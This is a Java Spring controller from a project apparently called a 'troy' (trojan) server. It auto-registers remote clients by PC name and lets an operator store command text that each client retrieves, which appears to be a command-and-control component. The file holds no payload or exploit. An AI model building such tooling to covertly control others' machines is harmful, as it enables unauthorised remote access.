package ch.lebois.troyserver.controller;

import ch.lebois.troyserver.data.Client;
import ch.lebois.troyserver.model.CommandModel;
import ch.lebois.troyserver.data.ClientRepository;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;

@Controller
@RequestMapping(value = "command/")
public class CommandController {

    private ClientRepository clientRepository;

    public CommandController(ClientRepository clientRepository) {
        this.clientRepository = clientRepository;
    }

    @RequestMapping(value = {"{client}"}, method = RequestMethod.GET)
    public String getCommands(@PathVariable(value = "client") String clientParam, CommandModel commandModel,
                              Model model) {

        Client client = clientRepository.findOne(clientParam);
        if (client == null) {
            client = new Client();
            client.setPcName(clientParam);
            clientRepository.save(client);
            return "dashboard";
        }

        commandModel.setCommands(client.getCommands());
        model.addAttribute("model", commandModel);
        return "commands";
    }

    @RequestMapping(value = {"/edit/{client}"}, method = RequestMethod.POST)
    public String edited(@PathVariable(value = "client") String clientParam,
                         @RequestParam(name = "commands") String commands) {

        Client client = clientRepository.findOne(clientParam);
        client.setCommands(commands);
        clientRepository.save(client);

        return "redirect:/dashboard/" + clientParam;
    }

}
